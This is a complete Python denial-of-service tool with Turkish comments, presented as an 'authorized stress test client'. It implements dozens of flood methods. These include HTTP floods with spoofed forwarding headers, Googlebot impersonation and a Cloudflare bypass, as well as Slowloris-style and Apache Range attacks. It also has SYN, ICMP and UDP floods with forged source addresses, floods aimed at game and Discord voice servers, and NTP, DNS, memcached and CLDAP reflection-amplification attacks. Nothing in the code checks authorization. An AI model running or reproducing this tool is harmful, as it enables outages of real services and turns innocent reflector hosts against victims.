#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
mori_flood.py — authorized stress test client
Requires: python3 (stdlib only). Optional: pip install requests cloudscraper

Usage:
  python3 mori_flood.py <target> <method> <duration> <threads>

  target   : http://example.com:80/ veya 1.2.3.4:80 (L4 için)
  method   : aşağıdan seç
  duration : saniye
  threads  : thread sayısı

L7 Methods  : GET POST HEAD PPS NULL OVH STRESS COOKIES APACHE XMLRPC
              DYN GSB RHEX STOMP BOT SLOW AVB CFB BYPASS EVEN DOWNLOADER
L4 Methods  : UDP TCP SYN ICMP CPS CONNECTION VSE TS3 MCPE FIVEM DISCORD
AMP Methods : RDP CLDAP MEM CHAR NTP DNS ARD (root + reflectors arg gerekir)

Örnekler:
  python3 mori_flood.py http://example.com/ GET 60 100
  python3 mori_flood.py 1.2.3.4:80 UDP 60 200
  python3 mori_flood.py 1.2.3.4:53 DNS 30 50 8.8.8.8,8.8.4.4
"""

import os, sys, random, socket, ssl, struct, threading, time
from contextlib import suppress
from itertools import cycle
from threading import Thread, Event
from urllib.parse import quote, urlparse

# ── opsiyonel ─────────────────────────────────────────────────────────────────
try:    from cloudscraper import create_scraper;  HAS_CS  = True
except: HAS_CS  = False
try:    from requests import Session as RS;        HAS_REQ = True
except: HAS_REQ = False
try:    import impacket.ImpactPacket as IMP;       HAS_IMP = True
except: HAS_IMP = False

# ── global ─────────────────────────────────────────────────────────────────────
_stop  = Event()
_lock  = threading.Lock()
SENT   = [0]
BYTES  = [0]

UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/74.0.3729.169 Safari/537.36",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "AdsBot-Google (+http://www.google.com/adsbot.html)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]
GBOT = [u for u in UA if "ooglebot" in u or "AdsBot" in u]
REF  = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
    "https://www.facebook.com/sharer/sharer.php?u=",
    "https://drive.google.com/viewerng/viewer?url=",
    "https://www.google.com/translate?u=",
    "https://duckduckgo.com/?q=",
    "https://t.co/",
]

def rstr(n=8):   return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=n))
def rip():       return '.'.join(str(random.randint(1,254)) for _ in range(4))
def rua():       return random.choice(UA)
def rref(h):     return random.choice(REF) + quote(h)
def rint(a,b):   return random.randint(a,b)

# ── kaynak izleme ──────────────────────────────────────────────────────────────
def cpu():
    try:
        import psutil; return psutil.cpu_percent(interval=0.3)
    except: pass
    if os.path.exists('/proc/stat'):
        def _r():
            with open('/proc/stat') as f: p=f.readline().split()
            return sum(int(x) for x in p[1:]), int(p[4])
        t1,i1=_r(); time.sleep(0.3); t2,i2=_r()
        d=t2-t1; return 100*(1-(i2-i1)/d) if d else 0
    return 0

def ram():
    try:
        import psutil; return psutil.virtual_memory().percent
    except: pass
    if os.path.exists('/proc/meminfo'):
        d={}
        with open('/proc/meminfo') as f:
            for l in f:
                k,v=l.split(':'); d[k.strip()]=int(v.strip().split()[0])
        t=d.get('MemTotal',1); return 100*(1-d.get('MemAvailable',t)/t)
    return 0

def guard(mx_cpu=80, mx_ram=75):
    """Sadece uyarı verir, durdurmaz. Süre zorunludur."""
    while not _stop.is_set():
        time.sleep(5)
        c,r=cpu(),ram()
        if c>mx_cpu or r>mx_ram:
            print(f"\033[93m[WARN] CPU={c:.0f}% RAM={r:.0f}% — yüksek kaynak kullanımı\033[0m", flush=True)

# ── soket yardımcıları ─────────────────────────────────────────────────────────
def mksock(host, port, tls=False, to=4):
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.settimeout(to); s.connect((host, port))
    if tls:
        ctx=ssl.create_default_context()
        ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
        s=ctx.wrap_socket(s, server_hostname=host)
    return s

def send(s, d):
    try:
        b=d if isinstance(d,bytes) else d.encode()
        s.sendall(b)
        with _lock: SENT[0]+=1; BYTES[0]+=len(b)
        return True
    except: return False

def sndto(s, d, a):
    try:
        s.sendto(d, a)
        with _lock: SENT[0]+=1; BYTES[0]+=len(d)
        return True
    except: return False

def close(s):
    with suppress(Exception):
        if s: s.close()

# ── raw paket oluşturucular ────────────────────────────────────────────────────
def mk_syn(sip, dip, dport):
    if HAS_IMP:
        ip=IMP.IP(); ip.set_ip_src(sip); ip.set_ip_dst(dip)
        t=IMP.TCP(); t.set_SYN(); t.set_th_flags(0x02)
        t.set_th_dport(dport); t.set_th_sport(rint(32768,65535))
        ip.contains(t); return ip.get_packet()
    s=socket.inet_aton(sip); d=socket.inet_aton(dip); sp=rint(1024,65535)
    ih=struct.pack('!BBHHHBBH4s4s',0x45,0,40,rint(0,65535),0,64,socket.IPPROTO_TCP,0,s,d)
    th=struct.pack('!HHIIBHHH',sp,dport,0,0,0x50,0x02,64240,0,0)
    return ih+th

def mk_icmp(sip, dip):
    if HAS_IMP:
        ip=IMP.IP(); ip.set_ip_src(sip); ip.set_ip_dst(dip)
        ic=IMP.ICMP(); ic.set_icmp_type(ic.ICMP_ECHO)
        ic.contains(IMP.Data(b'A'*rint(16,512))); ip.contains(ic); return ip.get_packet()
    pl=os.urandom(rint(16,512))
    h=struct.pack('bbHHh',8,0,0,rint(0,65535),1); dt=h+pl
    cs=0
    for i in range(0,len(dt),2):
        w=dt[i:i+2]
        if len(w)==2: cs+=struct.unpack('H',w)[0]
    cs=~((cs>>16)+(cs&0xffff))&0xffff
    return struct.pack('bbHHh',8,0,cs,rint(0,65535),1)+pl

def mk_amp(sip, dip, dport, payload):
    if HAS_IMP:
        ip=IMP.IP(); ip.set_ip_src(sip); ip.set_ip_dst(dip)
        u=IMP.UDP(); u.set_uh_sport(rint(1024,65535)); u.set_uh_dport(dport)
        u.contains(IMP.Data(payload)); ip.contains(u); return ip.get_packet()
    s=socket.inet_aton(sip); d=socket.inet_aton(dip)
    ud=struct.pack('!HHHH',rint(1024,65535),dport,8+len(payload),0)+payload
    ih=struct.pack('!BBHHHBBH4s4s',0x45,0,20+len(ud),rint(0,65535),0,64,socket.IPPROTO_UDP,0,s,d)
    return ih+ud

def mk_discord(sip, dip, dport):
    if HAS_IMP:
        ip=IMP.IP(); ip.set_ip_src(sip); ip.set_ip_dst(dip)
        u=IMP.UDP(); u.set_uh_sport(rint(32768,65535)); u.set_uh_dport(dport)
        pl=b'\x13\x37\xca\xfe\x01\x00\x00\x00\x13\x37\xca\xfe\x01\x00\x00\x00\x13\x37\xca\xfe\x01\x00\x00\x00'
        pl+=bytes([rint(0,255) for _ in range(4)])
        u.contains(IMP.Data(pl)); ip.contains(u); return ip.get_packet()
    # impacket yoksa raw UDP (root gerekir)
    sip_b=socket.inet_aton(sip); dip_b=socket.inet_aton(dip)
    pl=b'\x13\x37\xca\xfe\x01\x00\x00\x00'*3+bytes([rint(0,255) for _ in range(4)])
    sp=rint(32768,65535)
    ud=struct.pack('!HHHH',sp,dport,8+len(pl),0)+pl
    ih=struct.pack('!BBHHHBBH4s4s',0x45,0,20+len(ud),rint(0,65535),0,64,socket.IPPROTO_UDP,0,sip_b,dip_b)
    return ih+ud

# ── HTTP yük üretici ───────────────────────────────────────────────────────────
class Target:
    def __init__(self, url):
        u=urlparse(url if '://' in url else 'http://'+url)
        self.scheme=u.scheme or 'http'
        self.host=u.hostname or url
        self.port=u.port or (443 if self.scheme=='https' else 80)
        self.path=(u.path or '/')+('?'+u.query if u.query else '')
        self.auth=f'{self.host}:{self.port}'
        self.tls=self.scheme=='https'

    def spoof(self):
        sp=rip()
        return (f"X-Forwarded-Proto: Http\r\nX-Forwarded-Host: {self.host}, 1.1.1.1\r\n"
                f"Via: {sp}\r\nClient-IP: {sp}\r\nX-Forwarded-For: {sp}\r\nReal-IP: {sp}\r\n")

    def rh(self):
        return f"User-Agent: {rua()}\r\nReferrer: {rref(self.host)}\r\n"+self.spoof()

    def base(self, m='GET', p=None, v=None):
        pth=p or self.path; ver=v or random.choice(['1.0','1.1','1.2'])
        return (f"{m} {pth} HTTP/{ver}\r\nHost: {self.auth}\r\n"
                "Accept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\n"
                "Cache-Control: max-age=0\r\nConnection: keep-alive\r\n"
                "Sec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\n"
                "Sec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\n"
                "Sec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n")

    def GET(self, p=None): return (self.base('GET',p)+self.rh()+"\r\n").encode()
    def HEAD(self, p=None): return (self.base('HEAD',p)+self.rh()+"\r\n").encode()
    def PPS(self): return f"GET {self.path} HTTP/1.1\r\nHost: {self.host}\r\n\r\n".encode()
    def POST(self, body=None, ct='application/json'):
        b=body or f'{{"data":"{rstr(32)}"}}'
        return (self.base('POST')+self.rh()+
                f"Content-Type: {ct}\r\nContent-Length: {len(b)}\r\n"
                f"X-Requested-With: XMLHttpRequest\r\n\r\n{b}").encode()
    def conn(self, to=4): return mksock(self.host, self.port, self.tls, to)

# ══════════════════════════════════════════════════════════════════════════════
# L7 METOTLARI
# ══════════════════════════════════════════════════════════════════════════════
# Her worker kendi içinde loop yapar — bağlantı kopunca anında yeniden bağlanır,
# launcher spawn boşluğu olmaz → sabit yüksek RPS
def w_GET(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn(); pl=t.GET()
            for _ in range(rpc):
                if _stop.is_set() or not send(s,pl): break
            close(s)

def w_POST(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn()
            for _ in range(rpc):
                if _stop.is_set() or not send(s, t.POST()): break
            close(s)

def w_HEAD(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn(); pl=t.HEAD()
            for _ in range(rpc):
                if _stop.is_set() or not send(s,pl): break
            close(s)

def w_PPS(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn(); pl=t.PPS()
            for _ in range(rpc):
                if _stop.is_set() or not send(s,pl): break
            close(s)

def w_NULL(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn()
            pl=(t.base('GET')+t.spoof()+"User-Agent: null\r\nReferrer: null\r\n\r\n").encode()
            for _ in range(rpc):
                if _stop.is_set() or not send(s,pl): break
            close(s)

def w_OVH(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn(); pl=t.GET()
            for _ in range(min(rpc,5)):
                if _stop.is_set() or not send(s,pl): break
            close(s)

def w_STRESS(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn()
            for _ in range(rpc):
                if _stop.is_set(): break
                if not send(s, t.POST(f'{{"data":"{rstr(512)}"}}')): break
            close(s)

def w_COOKIES(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn()
            ck=f"_ga=GA{rint(1000,99999)};_gat=1;__cfduid=dc{rstr(32)};{rstr(6)}={rstr(32)}\r\n"
            pl=(t.base('GET')+t.rh()+f"Cookie: {ck}\r\n").encode()
            for _ in range(rpc):
                if _stop.is_set() or not send(s,pl): break
            close(s)

def w_APACHE(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn()
            rng="bytes=0-,"+",".join(f"5-{i}" for i in range(1,1024))
            pl=(t.base('GET')+t.rh()+f"Range: {rng}\r\n\r\n").encode()
            for _ in range(rpc):
                if _stop.is_set() or not send(s,pl): break
            close(s)

def w_XMLRPC(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            body=(f"<?xml version='1.0' encoding='iso-8859-1'?><methodCall>"
                  f"<methodName>pingback.ping</methodName><params>"
                  f"<param><value><string>{rstr(64)}</string></value></param>"
                  f"<param><value><string>{rstr(64)}</string></value></param>"
                  f"</params></methodCall>")
            s=t.conn()
            for _ in range(rpc):
                if _stop.is_set() or not send(s, t.POST(body,'application/xml')): break
            close(s)

def w_DYN(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn()
            for _ in range(rpc):
                if _stop.is_set(): break
                pl=(t.base('GET')+t.spoof()+
                    f"User-Agent: {rua()}\r\nHost: {rstr(6)}.{t.host}:{t.port}\r\n\r\n").encode()
                if not send(s,pl): break
            close(s)

def w_GSB(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn()
            for _ in range(rpc):
                if _stop.is_set(): break
                pl=(t.base('HEAD',f"{t.path}?qs={rstr(6)}&{rstr(4)}={rstr(8)}")+
                    t.rh()+"Connection: Keep-Alive\r\n\r\n").encode()
                if not send(s,pl): break
            close(s)

def w_RHEX(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn()
            for _ in range(rpc):
                if _stop.is_set(): break
                hx=os.urandom(random.choice([32,64,128])).hex()
                pl=(f"GET {t.path}/{hx} HTTP/1.1\r\nHost: {t.auth}/{hx}\r\n"
                    +t.rh()+"Accept-Encoding: gzip,deflate,br\r\nConnection: keep-alive\r\n\r\n").encode()
                if not send(s,pl): break
            close(s)

def w_STOMP(t, rpc):
    hx=(r'\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA')*22+' '
    dep="Accept-Encoding: gzip,deflate,br\r\nConnection: keep-alive\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"
    while not _stop.is_set():
        with suppress(Exception):
            p1=(f"GET {t.path}/{hx} HTTP/1.1\r\nHost: {t.auth}/{hx}\r\n"+t.rh()+dep).encode()
            p2=(f"GET {t.path}/cdn-cgi/l/chk_captcha HTTP/1.1\r\nHost: {hx}\r\n"+t.rh()+dep).encode()
            s=t.conn(); send(s,p1)
            for _ in range(rpc):
                if _stop.is_set() or not send(s,p2): break
            close(s)

def w_BOT(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            ua=random.choice(GBOT) if GBOT else rua()
            p1=(f"GET /robots.txt HTTP/1.1\r\nHost: {t.auth}\r\n"
                f"Connection: Keep-Alive\r\nAccept: text/plain,*/*\r\n"
                f"User-Agent: {ua}\r\nAccept-Encoding: gzip,deflate,br\r\n\r\n").encode()
            p2=(f"GET /sitemap.xml HTTP/1.1\r\nHost: {t.auth}\r\n"
                f"Connection: Keep-Alive\r\nAccept: */*\r\nFrom: googlebot(at)googlebot.com\r\n"
                f"User-Agent: {ua}\r\nAccept-Encoding: gzip,deflate,br\r\n"
                f"If-None-Match: {rstr(9)}-{rstr(4)}\r\n"
                f"If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n").encode()
            s=t.conn(); send(s,p1); send(s,p2)
            pl=t.GET()
            for _ in range(rpc):
                if _stop.is_set() or not send(s,pl): break
            close(s)

def w_SLOW(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn(60); send(s, t.GET())
            for _ in range(rpc):
                if _stop.is_set(): break
                time.sleep(random.uniform(0.5,2.0))
                if not send(s, f"X-a: {rint(1,9999)}\r\n".encode()): break
            close(s)

def w_AVB(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn(); pl=t.GET()
            for _ in range(rpc):
                if _stop.is_set(): break
                time.sleep(max(rpc/1000,1))
                if not send(s,pl): break
            close(s)

def w_CFB(t, rpc):
    url=f"{t.scheme}://{t.auth}{t.path}"
    while not _stop.is_set():
        if HAS_CS:
            with suppress(Exception), create_scraper() as s:
                for _ in range(rpc):
                    if _stop.is_set(): break
                    with suppress(Exception): s.get(url); SENT[0]+=1
        else:
            import urllib.request
            ctx2=ssl.create_default_context(); ctx2.check_hostname=False; ctx2.verify_mode=ssl.CERT_NONE
            req=urllib.request.Request(url, headers={"User-Agent": rua()})
            for _ in range(rpc):
                if _stop.is_set(): break
                with suppress(Exception): urllib.request.urlopen(req,timeout=5,context=ctx2); SENT[0]+=1

def w_BYPASS(t, rpc):
    url=f"{t.scheme}://{t.auth}{t.path}"
    while not _stop.is_set():
        if HAS_REQ:
            with suppress(Exception), RS() as s:
                for _ in range(rpc):
                    if _stop.is_set(): break
                    with suppress(Exception): s.get(url,headers={"User-Agent":rua()},timeout=5,verify=False); SENT[0]+=1
        else:
            w_CFB(t, rpc); break

def w_EVEN(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn(10); pl=t.GET()
            while not _stop.is_set():
                if not send(s,pl): break
                try: s.recv(512)
                except: break
            close(s)

def w_DOWNLOADER(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn(30); pl=t.GET()
            for _ in range(rpc):
                if _stop.is_set(): break
                send(s,pl)
                while not _stop.is_set():
                    time.sleep(0.01)
                    if not s.recv(1): break
            close(s)

# ══════════════════════════════════════════════════════════════════════════════
# L4 METOTLARI
# ══════════════════════════════════════════════════════════════════════════════
def w_UDP(host, port, *_):
    try: ip=socket.gethostbyname(host)
    except: ip=host
    with suppress(Exception):
        s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not _stop.is_set(): sndto(s, os.urandom(1024), (ip,port))
        close(s)

def w_TCP(host, port, *_):
    try: ip=socket.gethostbyname(host)
    except: ip=host
    with suppress(Exception):
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.settimeout(0.9); s.connect((ip,port))
        while not _stop.is_set():
            if not send(s, os.urandom(1024)): break
        close(s)

def w_SYN(host, port, *_):
    try: ip=socket.gethostbyname(host)
    except: ip=host
    has_root = (os.name != 'nt' and os.geteuid() == 0)
    if not has_root:
        # root yok: TCP bağlantı flood fallback
        w_TCP(host, port); return
    with suppress(Exception):
        s=socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        while not _stop.is_set(): sndto(s, mk_syn(rip(),ip,port), (ip,0))
        close(s)

def w_ICMP(host, *_):
    try: ip=socket.gethostbyname(host)
    except: ip=host
    has_root = (os.name != 'nt' and os.geteuid() == 0)
    if not has_root:
        # root yok: UDP fallback
        w_UDP(host, 0); return
    with suppress(Exception):
        s=socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        while not _stop.is_set(): sndto(s, mk_icmp(rip(),ip), (ip,0))
        close(s)

def w_CPS(host, port, *_):
    try: ip=socket.gethostbyname(host)
    except: ip=host
    with suppress(Exception):
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.settimeout(0.9); s.connect((ip,port))
        SENT[0]+=1; close(s)

def w_CONNECTION(host, port, *_):
    try: ip=socket.gethostbyname(host)
    except: ip=host
    def _a():
        with suppress(Exception):
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(0.9); s.connect((ip,port)); SENT[0]+=1
            while not _stop.is_set():
                if not s.recv(1): break
            close(s)
    Thread(target=_a, daemon=True).start()

def w_VSE(host, port, *_):
    try: ip=socket.gethostbyname(host)
    except: ip=host
    pl=b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
    with suppress(Exception):
        s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not _stop.is_set(): sndto(s, pl, (ip,port))
        close(s)

def w_TS3(host, port, *_):
    try: ip=socket.gethostbyname(host)
    except: ip=host
    pl=b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
    with suppress(Exception):
        s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not _stop.is_set(): sndto(s, pl, (ip,port))
        close(s)

def w_MCPE(host, port, *_):
    try: ip=socket.gethostbyname(host)
    except: ip=host
    pl=b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73'
    with suppress(Exception):
        s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not _stop.is_set(): sndto(s, pl, (ip,port))
        close(s)

def w_FIVEM(host, port, *_):
    try: ip=socket.gethostbyname(host)
    except: ip=host
    pl=b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
    with suppress(Exception):
        s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not _stop.is_set(): sndto(s, pl, (ip,port))
        close(s)

def w_DISCORD(host, port, *_):
    """Discord Voice/RTP — root varsa spoofed raw UDP, yoksa normal UDP fallback"""
    try: ip=socket.gethostbyname(host)
    except: ip=host
    # Discord RTP/RTCP payloadları
    def mk_pl():
        return random.choice([
            b'\x80\x78' + struct.pack('!H',rint(0,65535)) + os.urandom(4) + os.urandom(4) + os.urandom(rint(8,512)),
            b'\x13\x37\xca\xfe\x01\x00\x00\x00\x13\x37\xca\xfe\x01\x00\x00\x00' + os.urandom(rint(4,512)),
            b'\x00\x01\x00\x70' + b'\x21\x12\xa4\x42' + os.urandom(108),  # STUN
            b'\x80\x63' + struct.pack('!H',rint(0,65535)) + os.urandom(rint(32,512)),  # RTCP
            os.urandom(rint(512,1024)),
        ])
    # root varsa: IP spoof ile raw
    has_root = (os.name != 'nt' and os.geteuid() == 0)
    if has_root:
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            while not _stop.is_set():
                pkt=mk_discord(rip(), ip, port)
                sndto(s, pkt, (ip,port))
            close(s); return
        except: pass
    # root yok: normal UDP (hızlı, çalışır, IP spoof yok)
    with suppress(Exception):
        s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not _stop.is_set():
            sndto(s, mk_pl(), (ip,port))
        close(s)

# ── AMP reflection ─────────────────────────────────────────────────────────────
AMP_PAYLOADS = {
    'RDP':   (b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00', 3389),
    'CLDAP': (b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01'
              b'\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c'
              b'\x61\x73\x73\x30\x00', 389),
    'MEM':   (b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211),
    'CHAR':  (b'\x01', 19),
    'ARD':   (b'\x00\x14\x00\x00', 3283),
    'NTP':   (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123),
    'DNS':   (b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00'
              b'\x00\xff\x00\x01\x00\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00', 53),
}

def w_AMP(target_ip, amp_payload, amp_port, refs):
    with suppress(Exception):
        s=socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        pool=cycle(refs)
        while not _stop.is_set():
            ref=next(pool)
            sndto(s, mk_amp(target_ip, ref, amp_port, amp_payload), (ref,amp_port))
        close(s)

# ── tablo ──────────────────────────────────────────────────────────────────────
L7 = {
    'GET':w_GET, 'POST':w_POST, 'HEAD':w_HEAD, 'PPS':w_PPS, 'NULL':w_NULL,
    'OVH':w_OVH, 'STRESS':w_STRESS, 'COOKIES':w_COOKIES, 'APACHE':w_APACHE,
    'XMLRPC':w_XMLRPC, 'DYN':w_DYN, 'GSB':w_GSB, 'RHEX':w_RHEX,
    'STOMP':w_STOMP, 'BOT':w_BOT, 'SLOW':w_SLOW, 'AVB':w_AVB,
    'CFB':w_CFB, 'BYPASS':w_BYPASS, 'EVEN':w_EVEN, 'DOWNLOADER':w_DOWNLOADER,
}
L4 = {
    'UDP':w_UDP, 'TCP':w_TCP, 'SYN':w_SYN, 'ICMP':w_ICMP,
    'CPS':w_CPS, 'CONNECTION':w_CONNECTION,
    'VSE':w_VSE, 'TS3':w_TS3, 'MCPE':w_MCPE, 'FIVEM':w_FIVEM,
    'DISCORD':w_DISCORD,
}

# ── başlatıcı ──────────────────────────────────────────────────────────────────
def launch(fn, args, n):
    active=[]
    while not _stop.is_set():
        active=[t for t in active if t.is_alive()]
        while len(active)<n and not _stop.is_set():
            t=Thread(target=fn, args=args, daemon=True); t.start(); active.append(t)
        time.sleep(0.05)

# ── ana program ────────────────────────────────────────────────────────────────
def usage():
    print(__doc__); sys.exit(0)

def main():
    if len(sys.argv)<5 or sys.argv[1] in ('-h','--help','help'):
        usage()

    target_raw = sys.argv[1]
    method     = sys.argv[2].upper()
    duration   = int(sys.argv[3])
    threads    = int(sys.argv[4])
    # '_' veya çok küçük değer = varsayılanı kullan
    def arg(idx, default, cast=int, minval=None):
        if len(sys.argv) <= idx: return default
        v = sys.argv[idx].strip()
        if v in ('_', '-', '', '0'): return default
        try:
            r = cast(v)
            if minval is not None and r < minval: return default
            return r
        except: return default
    refs_raw = sys.argv[5].strip() if len(sys.argv)>5 else '_'
    refs     = [r.strip() for r in refs_raw.split(',') if r.strip() and r.strip()!='_']
    max_cpu  = arg(6, 80,  minval=10)   # < 10 ise 80 kullan
    max_ram  = arg(7, 75,  minval=10)   # < 10 ise 75 kullan
    rpc      = arg(8, 10,  minval=1)

    is_l7  = method in L7
    is_l4  = method in L4
    is_amp = method in AMP_PAYLOADS

    if not is_l7 and not is_l4 and not is_amp:
        print(f"\033[91m[HATA] Bilinmeyen metot: {method}\033[0m")
        print("L7 :", ' '.join(sorted(L7)))
        print("L4 :", ' '.join(sorted(L4)))
        print("AMP:", ' '.join(sorted(AMP_PAYLOADS)))
        sys.exit(1)

    has_root = (os.name != 'nt' and os.geteuid() == 0)
    if is_amp and not has_root:
        print(f"\033[91m[HATA] AMP ({method}) root gerektirir → sudo python3 ...\033[0m")
        sys.exit(1)
    if method in ('SYN','ICMP','DISCORD') and not has_root:
        print(f"\033[93m[INFO] {method}: root yok → UDP/TCP fallback ile çalışacak\033[0m")

    # hedef parse
    if is_l7:
        tgt = Target(target_raw)
        host, port = tgt.host, tgt.port
        label = f"{tgt.scheme}://{tgt.auth}{tgt.path}"
    else:
        if '://' in target_raw:
            u=urlparse(target_raw); host,port=u.hostname, u.port or 80
        elif ':' in target_raw:
            host,port=target_raw.rsplit(':',1); port=int(port)
        else:
            host,port=target_raw,80
        tgt=None; label=f"{host}:{port}"

    # başlık
    bar="═"*60
    print(f"\033[96m{bar}")
    print(f"  mori_flood — {method} → {label}")
    print(f"  Threads={threads} | Duration={duration}s | RPC={rpc}")
    print(f"  CPU<{max_cpu}% RAM<{max_ram}%")
    if HAS_IMP: print("  [+] impacket (raw packet support)")
    if HAS_CS:  print("  [+] cloudscraper (CF bypass)")
    if HAS_REQ: print("  [+] requests (session bypass)")
    print(f"{bar}\033[0m", flush=True)

    # watchdog başlat
    Thread(target=guard, args=(max_cpu,max_ram), daemon=True).start()

    # zamanlayıcı
    def stopper():
        time.sleep(duration); _stop.set()
        print(f"\n\033[92m[BİTTİ] {duration}s | {SENT[0]:,} paket | {BYTES[0]/1024/1024:.1f} MB\033[0m", flush=True)
    Thread(target=stopper, daemon=True).start()

    # durum çıktısı
    def status():
        t0=time.time()
        while not _stop.is_set():
            time.sleep(5)
            el=time.time()-t0
            pps=SENT[0]/el if el>0 else 0
            mbps=BYTES[0]/el/1024/1024*8 if el>0 else 0
            print(f"\033[33m[STAT] {SENT[0]:,} paket | {pps:.0f} pps | {mbps:.1f} Mbps | CPU={cpu():.0f}% RAM={ram():.0f}%\033[0m", flush=True)
    Thread(target=status, daemon=True).start()

    # çalıştır
    try:
        if is_l7:
            fn=L7[method]
            launch(fn, (tgt, rpc), threads)
        elif is_amp:
            if not refs:
                print("\033[91m[HATA] AMP için reflector gerekli: python3 mori_flood.py ... 8.8.8.8,8.8.4.4\033[0m")
                sys.exit(1)
            try: tip=socket.gethostbyname(host)
            except: tip=host
            ap,aprt=AMP_PAYLOADS[method]
            launch(w_AMP, (tip,ap,aprt,refs), threads)
        else:
            fn=L4[method]
            launch(fn, (host,port), threads)
    except KeyboardInterrupt:
        _stop.set()

    while not _stop.is_set(): time.sleep(0.1)
    time.sleep(0.3)
    print(f"\033[96m[SON] Gönderilen={SENT[0]:,} | Bytes={BYTES[0]:,}\033[0m", flush=True)

if __name__=='__main__':
    main()
